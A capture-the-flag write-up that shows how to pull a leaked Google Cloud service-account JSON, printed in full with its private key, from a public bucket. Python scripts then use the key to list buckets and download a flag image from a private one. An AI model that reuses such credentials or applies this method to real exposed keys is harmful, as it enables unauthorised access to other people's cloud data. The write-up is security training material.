# Miscellaneous 

## Out of the Bucket 2

This is a continuation of "Out of the Bucket". Take a look around and see if you find anything!

https://storage.googleapis.com/out-of-the-bucket/src/index.html

---

### Solution

Now, we go to the json file.

![bucket](https://media.discordapp.net/attachments/758115188796162088/1196502915163103242/image.png?ex=65b7dd2c&is=65a5682c&hm=cedc5d1eaa3dcc1484fac0838e04b674d0860cc8ee9a6700d9e11fa8a3662802&=&format=webp&quality=lossless&width=1578&height=1168)

```bash
$ wget https://storage.googleapis.com/out-of-the-bucket/secret/funny.json
--2024-01-16 00:21:00--  https://storage.googleapis.com/out-of-the-bucket/secret/funny.json
Saving to: ‘funny.json’

$ cat funny.json   
{
  "type": "service_account",
  "project_id": "out-of-the-bucket",
  "private_key_id": "21e0c4c5ef71d9df424d40eed4042ffc2e0af224",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDWxpWEDNiWgMzz\nxDDF64CspqiGPxkrHfhS4/PX8BrxNjUMPAH7vYHE3KbgQsmPhbCte9opnSLdMqec\nWjll8lRZGEy73xhWd2e3tVRAf53r+pW/p6MTOsz3leUkQAscG4hmOVOpGb1AkfuE\n62NErJVZIgQCowrBdFGbPxQc/IRQJKzrCFfKOWSHLvnngr4Ui5CSr6OM33dfpD+v\nQSLkEQheYCXmHwh/Wf8b27be+RzfOp/hOyjKsJOmDvFu2+rrx24t8hCptof3BYol\nUjpaiB8Qcct/HoKOEvZ/S5rW6toQizP8t4t7urC2i70JdH+Y4Qw/AZJNuLo/5wW1\n+x8i3FIDAgMBAAECggEABaGapVC06RVNdQ1tffL+d7MS8296GHWmX34B6bqDlP7S\nhenuNLczoiwVkAcQQ9wXKs/22Lp5rIpkd1FXn0MAT9RhnAIYdZlB4JY3iaK5oEin\nXn67Dt5Ze3BfBq6ghpx43L1KDUKogfs8jgVMoANVEyDfhrYsVQWDZ5T60QZp7bP2\n0zSDSACZpFzdf1vXzOhero8ykwM3keQiCIKWYkeMGsX8oHyWr1fz7AkU+pLciV67\nek10ItJUV70n2C65FgrW2Z1TpPKlpNEm8jQLSax9Bi89HuFEw8UjTfxKKzhLFXEu\nudtAyebt/PC4HS9FLBioo3bAy8vL3o00b7+raVyJQQKBgQD3IWaD5q5s7H0r10S/\n7IUhP1TDYhbLh7pupbzDGzu9wCFCMItwTEm9nYVNToKwV+YpeyoptEHQa4CAVp21\nO4+W7mBQgYemimjTtx1bIW8qzdQ9+ltQXyFAxj6m3KcuAsAzSpcHkbP46lCL5QoT\nTS6T06Fs4xvnTKtBdPeisSgiIwKBgQDee+mp5gsk8ynnp6fx0/liuO3AZxpTYcP8\nixaXLQI6CI4jQP2+P+FWNCTmEJxMaddXNOmmTaKu25S2H0KKMiQkQPuwBqskck3J\npVTHudnUuZAZWE7YPg40MJgg5OQhMVwiqGWL76FT2bubIdNm4LQyxvDeK82XQYl8\nszeOXfJeoQKBgGQqSoXdwwbtF5Lkbr4nnJIsPCvxHvIhskPUs1yVNjKjpBdS28GJ\nej37kaMS1k+pYOWhQSakJCTY3b2m3ccuO/Xd6nXW+mdbJD/jsWdVdtxvjr4MMmSy\nGiVJ9Ozm9G/mt4ZSjkKIIN0cA8ef7uSB3QYXug8LQi0O2z7trM1pZq3nAoGAMPhD\nOSMqRsrC6XtMivzmQmWD5zqKX9oAAmE26rV8bPufFYFjmHGFDq1RhdYYIPWW8Vnz\nJ6ik6ynntKJyyeo5bEVlYJxHJTGHj5+1ZnSwzpK9dearDAu0oqYjhfH7iJbNuc8o\n8sEe2E7vbTjnyBgjcZ26PJyVlvpU4b6stshU5aECgYEA7ZESXuaNV0Er3emHiAz4\noEStvFgzMDi8dILH+PtC3J2EnguVjMy2fceQHxQKP6/DCFlNqf9KUNqJBKVGxRWP\nIM1rcoAmf0sGQ5gl1B1K8PidhOi3dHF0nkYvivuMoj7sEyr9K88y69kdpVJ3J556\nJWqkWLCz8hx+LcQPfDJu0YE=\n-----END PRIVATE KEY-----\n",
  "client_email": "image-server@out-of-the-bucket.iam.gserviceaccount.com",
  "client_id": "102040203348783466577",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/image-server%40out-of-the-bucket.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}
```



```python
# file: list-bucket.py
from google.cloud import storage
# Set the path to your service account key JSON file
key_path = 'funny.json'

# Create a client using the service account key for authentication
client = storage.Client.from_service_account_json(key_path)

# List all available buckets
buckets = client.list_buckets()
for bucket in buckets:
    print(bucket.name)


"""
--> Result <--
flag-images
out-of-the-bucket
"""
```


```python
# file: download-bucket.py
import os
from google.cloud import storage
# Set the path to your service account key JSON file
key_path = 'funny.json'

# Create a client using the service account key for authentication
client = storage.Client.from_service_account_json(key_path)

bucket = client.get_bucket('flag-images')
blobs = bucket.list_blobs()

for blob in blobs:
    if blob.name == "256x192/xa.png":
        # Extract the file name from the blob's name
        file_name = blob.name

        # Define the local path where the file will be downloaded
        local_path = f'./storage/{file_name}'

        # Create the directory if it doesn't exist
        os.makedirs(os.path.dirname(local_path), exist_ok=True)

        # Download the file
        blob.download_to_filename(local_path)
        print(f'Downloaded: {file_name}')

"""
--> Result <--
Downloaded: 256x192/xa.png
"""
```

![flag](https://media.discordapp.net/attachments/758115188796162088/1196505388040863885/xa.png?ex=65b7df7a&is=65a56a7a&hm=8f19d211a90ace8def177b4a5c68eeeb801ca6cb4a238bbc6dc2a25e5e67c2fd&=&format=webp&quality=lossless&width=512&height=384)

### uoftctf{s3rv1c3_4cc0un75_c4n_83_un54f3}